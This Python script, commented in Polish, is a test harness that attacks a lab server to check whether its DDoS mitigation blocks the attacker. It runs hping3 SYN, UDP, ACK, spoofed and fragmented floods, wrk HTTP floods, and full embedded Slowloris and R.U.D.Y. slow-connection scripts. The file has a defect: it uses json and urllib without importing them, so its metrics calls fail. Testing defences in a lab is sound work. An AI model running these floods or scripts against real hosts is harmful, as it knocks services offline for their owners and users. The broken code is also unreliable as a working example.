#!/usr/bin/env python3
import subprocess
import time
import sys
import os

# --- KONFIGURACJA ---
SERVER_IP = "10.0.0.1"
HTTP_URL = f"http://{SERVER_IP}/"
ATTACKER_IP = "10.0.0.2" # Główne IP atakującego
LEGIT_IP = "10.0.0.3"    # Dodatkowe IP do symulacji legalnego ruchu

# ANSI Colors
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

results = []

def run_cmd(cmd, bg=False):
    """Wykonuje polecenie w powłoce systemowej maszyny atakującego."""
    if isinstance(cmd, str):
        cmd = cmd.split()
    if bg:
        return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        try:
            return subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        except subprocess.TimeoutExpired as e:
            return e

def get_egress_interface():
    """Wykrywa interfejs sieciowy używany do komunikacji z serwerem."""
    res = run_cmd(f"ip route get {SERVER_IP}")
    if isinstance(res, subprocess.CompletedProcess) and res.returncode == 0:
        parts = res.stdout.split()
        if "dev" in parts:
            idx = parts.index("dev")
            return parts[idx + 1]
    return "enp0s8" # Fallback

def is_banned(source_ip=None):
    """Weryfikuje blokadę poprzez próbę wysłania pakietu Ping do serwera."""
    cmd = f"ping -c 2 -W 1 {SERVER_IP}"
    if source_ip:
        cmd = f"ping -c 2 -W 1 -I {source_ip} {SERVER_IP}"
    res = run_cmd(cmd)
    return res.returncode != 0

def prompt_reset():
    """Oczekuje na zresetowanie serwera przed kolejnym testem."""
    print(f"\n{CYAN}[!] Zresetuj środowisko na Serwerze (zrestartuj control_plane.py){RESET}")
    input(f"{BOLD}{YELLOW}Naciśnij ENTER, gdy serwer będzie gotowy...{RESET}")

def report(scenario, status):
    print(f"[{status}] {scenario}")
    results.append([scenario, status])

# =======================================================================
# METRYKI
# =======================================================================

def capture_metrics(scenario, phase):
    """Wyzwalacz API serwera - żąda wykonania 1-sekundowego pomiaru zasobów."""
    print(f"    {CYAN}[*] Metryki serwera: {phase}...{RESET}")
    data = json.dumps({"scenario": scenario, "phase": phase}).encode('utf-8')
    req = urllib.request.Request(
        f"http://{SERVER_IP}:9999/capture", 
        data=data, 
        headers={'Content-Type': 'application/json'}, 
        method='POST'
    )
    try:
        urllib.request.urlopen(req, timeout=5)
    except Exception as e:
        print(f"    {RED}[!] Błąd API metryk na serwerze: {e}{RESET}")

# =======================================================================
# SCENARIUSZE TESTOWE
# =======================================================================

def test_l4_syn_flood():
    name = "1: L4 SYN Flood"
    print(f"\n{YELLOW}--- Scenariusz {name} ---{RESET}")
    prompt_reset()
    
    capture_metrics(name, "Phase 1: Baseline")
    print("[*] Generowanie ruchu SYN Flood (hping3)...")
    proc = run_cmd(f"hping3 -S -p 80 -i u1000 {SERVER_IP}", bg=True)
    time.sleep(1.5)
    
    capture_metrics(name, "Phase 2: Pre-Mitigation")
    print(f"    {CYAN}[*] Mierzenie przyrostu po mitygacji (Sustained Stress)...{RESET}")
    for i in range(2):
        time.sleep(2)
        capture_metrics(name, f"Phase 2A: Sustained Stress ({i+1}/2)")
        
    proc.kill()
    time.sleep(2)
    capture_metrics(name, "Phase 3: Post-Mitigation")
    
    if is_banned(): report(name, f"{GREEN}ZABLOKOWANO (SUKCES){RESET}")
    else: report(name, f"{RED}BRAK BLOKADY (FAIL){RESET}")

def test_l7_http_flood():
    name = "2: L7 HTTP Flood"
    print(f"\n{YELLOW}--- Scenariusz {name} ---{RESET}")
    prompt_reset()
    
    capture_metrics(name, "Phase 1: Baseline")
    print("[*] Generowanie ruchu HTTP Flood (wrk)...")
    proc = run_cmd(f"wrk -t4 -c100 -d20s {HTTP_URL}", bg=True)
    time.sleep(1.5)
    
    capture_metrics(name, "Phase 2: Pre-Mitigation")
    for i in range(2):
        time.sleep(3)
        capture_metrics(name, f"Phase 2A: Sustained Stress ({i+1}/2)")
        
    proc.kill()
    time.sleep(2)
    capture_metrics(name, "Phase 3: Post-Mitigation")
    
    if is_banned(): report(name, f"{GREEN}ZABLOKOWANO (SUKCES){RESET}")
    else: report(name, f"{RED}BRAK BLOKADY (FAIL){RESET}")

def test_l7_error_flood():
    name = "3: L7 Error Flood (404)"
    print(f"\n{YELLOW}--- Scenariusz {name} ---{RESET}")
    prompt_reset()
    
    capture_metrics(name, "Phase 1: Baseline")
    print("[*] Generowanie zapytań do nieistniejącego zasobu (wrk)...")
    proc = run_cmd(f"wrk -t4 -c20 -d15s {HTTP_URL}nonexistent_page", bg=True)
    time.sleep(1.5)
    
    capture_metrics(name, "Phase 2: Pre-Mitigation")
    time.sleep(8)
    
    proc.kill()
    time.sleep(2)
    capture_metrics(name, "Phase 3: Post-Mitigation")
    
    if is_banned(): report(name, f"{GREEN}ZABLOKOWANO (SUKCES){RESET}")
    else: report(name, f"{RED}BRAK BLOKADY (FAIL){RESET}")

def test_gru_stealth_syn():
    name = "4: Low & Slow SYN (GRU)"
    print(f"\n{YELLOW}--- Scenariusz {name} ---{RESET}")
    prompt_reset()
    
    capture_metrics(name, "Phase 1: Baseline")
    print("[*] Generowanie powolnego ataku SYN Flood (10 pkt/s)...")
    proc = run_cmd(f"hping3 -S -p 80 -i u100000 {SERVER_IP}", bg=True)
    time.sleep(5)
    
    capture_metrics(name, "Phase 2: Pre-Mitigation")
    time.sleep(15) # GRU potrzebuje długiej sekwencji (min. 15 żądań)
    
    proc.kill()
    time.sleep(2)
    capture_metrics(name, "Phase 3: Post-Mitigation")
    
    if is_banned(): report(name, f"{GREEN}ZABLOKOWANO (SUKCES){RESET}")
    else: report(name, f"{RED}BRAK BLOKADY (FAIL){RESET}")

def test_l7_slowloris():
    name = "5: L7 Slowloris"
    print(f"\n{YELLOW}--- Scenariusz {name} ---{RESET}")
    prompt_reset()
    
    capture_metrics(name, "Phase 1: Baseline")
    script_path = "/tmp/slowloris_test.py"
    with open(script_path, "w") as f:
        f.write(f"""import socket, random, time
TARGET_IP = "{SERVER_IP}"; PORT = 80; SOCKET_COUNT = 49; sockets = []
def create_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4); s.connect((TARGET_IP, PORT))
        s.send(f"GET /?r={{random.randint(0,2000)}} HTTP/1.1\\r\\nHost: {{TARGET_IP}}\\r\\n".encode())
        return s
    except: return None
for _ in range(SOCKET_COUNT):
    s = create_socket()
    if s: sockets.append(s)
while True:
    for s in list(sockets):
        try: s.send(f"X-Keep-Alive: {{random.randint(1, 5000)}}\\r\\n".encode())
        except: sockets.remove(s)
    for _ in range(SOCKET_COUNT - len(sockets)):
        s = create_socket()
        if s: sockets.append(s)
    time.sleep(8)
""")
    print("[*] Wykonywanie skryptu Slowloris...")
    proc = run_cmd(f"python3 {script_path}", bg=True)
    time.sleep(2)
    
    capture_metrics(name, "Phase 2: Pre-Mitigation")
    time.sleep(20)
    
    proc.kill()
    time.sleep(2)
    capture_metrics(name, "Phase 3: Post-Mitigation")
    
    if is_banned(): report(name, f"{GREEN}ZABLOKOWANO (SUKCES){RESET}")
    else: report(name, f"{RED}BRAK BLOKADY (FAIL){RESET}")

def test_benign_traffic():
    name = "6: Benign Traffic"
    print(f"\n{YELLOW}--- Scenariusz {name} ---{RESET}")
    prompt_reset()
    
    capture_metrics(name, "Phase 1: Baseline")
    print("[*] Wysyłanie standardowych żądań HTTP (curl) przez 10 sekund...")
    
    for i in range(10):
        if i == 3: capture_metrics(name, "Phase 2: Pre-Mitigation")
        run_cmd(f"curl -s -o /dev/null {HTTP_URL}")
        time.sleep(1)
        
    capture_metrics(name, "Phase 3: Post-Mitigation")
    
    if not is_banned(): report(name, f"{GREEN}BRAK BLOKADY (SUKCES){RESET}")
    else: report(name, f"{RED}ZABLOKOWANO (FAIL - False Positive){RESET}")

def test_l4_udp_flood():
    name = "7: L4 UDP Flood"
    print(f"\n{YELLOW}--- Scenariusz {name} ---{RESET}")
    prompt_reset()
    
    capture_metrics(name, "Phase 1: Baseline")
    print("[*] Generowanie ruchu UDP Flood (hping3)...")
    proc = run_cmd(f"hping3 --udp -p 80 --flood {SERVER_IP}", bg=True)
    time.sleep(1.5)
    
    capture_metrics(name, "Phase 2: Pre-Mitigation")
    for i in range(2):
        time.sleep(2)
        capture_metrics(name, f"Phase 2A: Sustained Stress ({i+1}/2)")
        
    proc.kill()
    time.sleep(2)
    capture_metrics(name, "Phase 3: Post-Mitigation")
    
    if is_banned(): report(name, f"{GREEN}ZABLOKOWANO (SUKCES){RESET}")
    else: report(name, f"{RED}BRAK BLOKADY (FAIL){RESET}")

def test_global_spoofed_syn():
    name = "8: Spoofed SYN Flood"
    print(f"\n{YELLOW}--- Scenariusz {name} ---{RESET}")
    prompt_reset()
    
    capture_metrics(name, "Phase 1: Baseline")
    print("[*] Generowanie SYN Flood z losowych adresów IP (--rand-source)...")
    proc = run_cmd(f"hping3 -S -p 80 --rand-source --flood {SERVER_IP}", bg=True)
    time.sleep(1.5)
    
    capture_metrics(name, "Phase 2: Pre-Mitigation")
    for i in range(2):
        time.sleep(2)
        capture_metrics(name, f"Phase 2A: Sustained Stress ({i+1}/2)")
        
    proc.kill()
    time.sleep(2)
    capture_metrics(name, "Phase 3: Post-Mitigation")
    
    print(f"{CYAN}[!] Sprawdź na serwerze log: '[L4-GLOBAL] ... SYN cookies ENABLED'{RESET}")
    if not is_banned(): report(name, f"{GREEN}WYKONANO (Sprawdź logi serwera){RESET}")
    else: report(name, f"{RED}BŁĄD (Atakujący zablokowany?){RESET}")

def test_mixed_traffic():
    name = "9: Mixed Traffic"
    print(f"\n{YELLOW}--- Scenariusz {name} ---{RESET}")
    prompt_reset()
    
    iface = get_egress_interface()
    print(f"[*] Dodawanie drugiego IP ({LEGIT_IP}) do interfejsu {iface} dla symulacji...")
    run_cmd(f"ip addr add {LEGIT_IP}/24 dev {iface}")
    
    capture_metrics(name, "Phase 1: Baseline")
    
    print("[*] Uruchamianie legalnego klienta (curl w tle)...")
    cmd_legit = f"bash -c 'for i in {{1..25}}; do curl -s --interface {LEGIT_IP} {HTTP_URL} > /dev/null; sleep 1; done'"
    proc_legit = run_cmd(cmd_legit, bg=True)
    
    print("[*] Uruchamianie ataku z głównego IP...")
    proc_attacker = run_cmd(f"hping3 -a {ATTACKER_IP} -S -p 80 -i u100000 {SERVER_IP}", bg=True)
    time.sleep(5)
    
    capture_metrics(name, "Phase 2: Pre-Mitigation")
    time.sleep(15) # Czekamy na detekcję GRU ML
    
    proc_attacker.kill()
    proc_legit.kill()
    time.sleep(2)
    capture_metrics(name, "Phase 3: Post-Mitigation")
    
    attacker_banned = is_banned(ATTACKER_IP)
    legit_banned = is_banned(LEGIT_IP)
    run_cmd(f"ip addr del {LEGIT_IP}/24 dev {iface}") # Cleanup
    
    if attacker_banned and not legit_banned:
        report(name, f"{GREEN}ZABLOKOWANO TYLKO ATAKUJĄCEGO (SUKCES){RESET}")
    else:
        err_msg = "OBA ZABLOKOWANE" if legit_banned else "BRAK BLOKADY"
        report(name, f"{RED}BŁĄD ({err_msg}){RESET}")

def test_l4_ack_flood():
    name = "10: ACK Flood"
    print(f"\n{YELLOW}--- Scenariusz {name} ---{RESET}")
    prompt_reset()
    
    capture_metrics(name, "Phase 1: Baseline")
    print("[*] Generowanie ruchu ACK Flood (hping3)...")
    proc = run_cmd(f"hping3 -A -p 80 --flood {SERVER_IP}", bg=True)
    time.sleep(1.5)
    
    capture_metrics(name, "Phase 2: Pre-Mitigation")
    for i in range(2):
        time.sleep(2)
        capture_metrics(name, f"Phase 2A: Sustained Stress ({i+1}/2)")
        
    proc.kill()
    time.sleep(2)
    capture_metrics(name, "Phase 3: Post-Mitigation")
    
    if is_banned(): report(name, f"{GREEN}ZABLOKOWANO (SUKCES){RESET}")
    else: report(name, f"{RED}BRAK BLOKADY (FAIL){RESET}")

def test_l7_rudy():
    name = "11: L7 Slow POST (R.U.D.Y.)"
    print(f"\n{YELLOW}--- Scenariusz {name} ---{RESET}")
    prompt_reset()
    
    capture_metrics(name, "Phase 1: Baseline")
    script_path = "/tmp/rudy_test.py"
    with open(script_path, "w") as f:
        f.write(f"""import socket, random, time
TARGET_IP = "{SERVER_IP}"; PORT = 80; SOCKET_COUNT = 49; sockets = []
def create_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4); s.connect((TARGET_IP, PORT))
        s.send(f"POST /?r={{random.randint(0,2000)}} HTTP/1.1\\r\\nHost: {{TARGET_IP}}\\r\\nContent-Length: 1000000\\r\\n\\r\\n".encode())
        return s
    except: return None
for _ in range(SOCKET_COUNT):
    s = create_socket()
    if s: sockets.append(s)
while True:
    for s in list(sockets):
        try: s.send(b"a")
        except: sockets.remove(s)
    for _ in range(SOCKET_COUNT - len(sockets)):
        s = create_socket()
        if s: sockets.append(s)
    time.sleep(4)
""")
    print("[*] Wykonywanie skryptu R.U.D.Y....")
    proc = run_cmd(f"python3 {script_path}", bg=True)
    time.sleep(2)
    
    capture_metrics(name, "Phase 2: Pre-Mitigation")
    time.sleep(20)
    
    proc.kill()
    time.sleep(2)
    capture_metrics(name, "Phase 3: Post-Mitigation")
    
    if is_banned(): report(name, f"{GREEN}ZABLOKOWANO (SUKCES){RESET}")
    else: report(name, f"{RED}BRAK BLOKADY (FAIL){RESET}")

def test_l7_yoyo():
    name = "12: L7 Yo-Yo Attack"
    print(f"\n{YELLOW}--- Scenariusz {name} ---{RESET}")
    prompt_reset()
    
    capture_metrics(name, "Phase 1: Baseline")
    script_path = "/tmp/yoyo_test.sh"
    with open(script_path, "w") as f:
        f.write(f"""#!/bin/bash
while true; do
    wrk -t2 -c50 -d2s {HTTP_URL} > /dev/null 2>&1
    sleep 6
done
""")
    os.chmod(script_path, 0o755)
    
    print("[*] Wykonywanie ataku Yo-Yo (pulsacyjne uderzenia wrk)...")
    proc = run_cmd(f"bash {script_path}", bg=True)
    time.sleep(2)
    
    capture_metrics(name, "Phase 2: Pre-Mitigation")
    time.sleep(18)
    
    proc.kill()
    time.sleep(2)
    capture_metrics(name, "Phase 3: Post-Mitigation")
    
    if is_banned(): report(name, f"{GREEN}ZABLOKOWANO (SUKCES){RESET}")
    else: report(name, f"{RED}BRAK BLOKADY (FAIL){RESET}")

def test_l3_fragmentation():
    name = "13: IP Fragmentation"
    print(f"\n{YELLOW}--- Scenariusz {name} ---{RESET}")
    prompt_reset()
    
    capture_metrics(name, "Phase 1: Baseline")
    print("[*] Generowanie pofragmentowanych pakietów IP (hping3 -f)...")
    proc = run_cmd(f"hping3 -S -p 80 -f --fragoff 20 --flood {SERVER_IP}", bg=True)
    time.sleep(1.5)
    
    capture_metrics(name, "Phase 2: Pre-Mitigation")
    for i in range(2):
        time.sleep(2)
        capture_metrics(name, f"Phase 2A: Sustained Stress ({i+1}/2)")
        
    proc.kill()
    time.sleep(2)
    capture_metrics(name, "Phase 3: Post-Mitigation")
    
    if is_banned(): report(name, f"{GREEN}ZABLOKOWANO (SUKCES){RESET}")
    else: report(name, f"{RED}BRAK BLOKADY (FAIL){RESET}")

def run_all():
    if os.geteuid() != 0:
        print(f"{RED}[-] Skrypt wymaga uprawnień roota (sudo).{RESET}")
        sys.exit(1)
        
    print("[*] Sprawdzanie narzędzi (hping3, wrk, curl)...")
    for t in ["hping3", "wrk", "curl"]:
        if run_cmd(f"which {t}").returncode != 0:
            print(f"{YELLOW}[!] Brak narzędzia {t}. Część testów się nie powiedzie.{RESET}")

    test_l4_syn_flood()
    test_l7_http_flood()
    test_l7_error_flood()
    test_gru_stealth_syn()
    test_l7_slowloris()
    test_benign_traffic()
    test_l4_udp_flood()
    test_global_spoofed_syn()
    test_mixed_traffic()
    test_l4_ack_flood()
    test_l7_rudy()
    test_l7_yoyo()
    test_l3_fragmentation()
    
    print(f"\n{YELLOW}=== PODSUMOWANIE WSZYSTKICH TESTÓW ==={RESET}")
    print(f"{'Scenariusz':<35} | {'Wynik'}")
    print("-" * 65)
    for row in results:
        print(f"{row[0]:<35} | {row[1]}")

if __name__ == "__main__":
    run_all()